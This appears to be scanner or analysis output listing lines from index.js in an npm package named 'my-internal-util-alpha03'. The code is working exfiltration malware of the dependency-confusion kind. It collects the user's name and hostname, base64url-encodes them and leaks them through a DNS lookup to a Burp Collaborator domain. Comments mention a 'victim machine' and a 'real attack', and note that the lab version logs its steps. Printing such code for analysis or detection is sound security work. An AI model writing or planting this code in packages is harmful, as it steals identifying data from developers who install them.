// File: var/folders/83/v1gvs5x976xdn94tnyk95j8r0000gq/T/tmpsjs6nj_s/my-internal-util-alpha03/package/index.js
// ======================================================================
Line 2: const dns = require('dns')
Line 3: const os = require('os')
Line 11: {
    // 1. Gather information from the victim machine
    const userInfo = os.userInfo();
    const username = userInfo.username;
    const hostname = os.hostname();
    const dataToExfiltrate = `user=${username};host=${hostname}`;

    // 2. Encode the data using 'base64url' format.
    // This is crucial because it produces a string that is safe for use in URLs and DNS names.
    // It automatically handles characters like '+' and '/' without manual replacement.
    const encodedData = Buffer.from(dataToExfiltrate).toString('base64url');

    // 3. Construct the malicious domain to query
    const exfilDomain = `${encodedData}.${collaboratorUrl}`;

    console.log(`[+] Exfiltrating data via DNS lookup to: ${exfilDomain}`);

    // 4. Trigger the DNS lookup.
    // We don't care about the result, just that the DNS query is made.
    // The 'error' in the callback is expected because the domain won't resolve.
    dns.lookup(exfilDomain, (err, address, family) => {
        if (err) ...
Line 13: os.userInfo()
Line 15: os.hostname()
Line 21: Buffer.from(dataToExfiltrate).toString('base64url')
Line 26: console.log(`[+] Exfiltrating data via DNS lookup to: ${exfilDomain}`)
Line 32: {
            console.log('[+] DNS lookup sent successfully. Check Burp Collaborator for the callback.');
        }
Line 33: console.log('[+] DNS lookup sent successfully. Check Burp Collaborator for the callback.')
Line 37: catch (e) {
    // Fail silently in a real attack, but log for debugging in the lab.
    console.error('[-] An error occurred in the exfiltration script:', e);
}
Line 39: console.error('[-] An error occurred in the exfiltration script:', e)
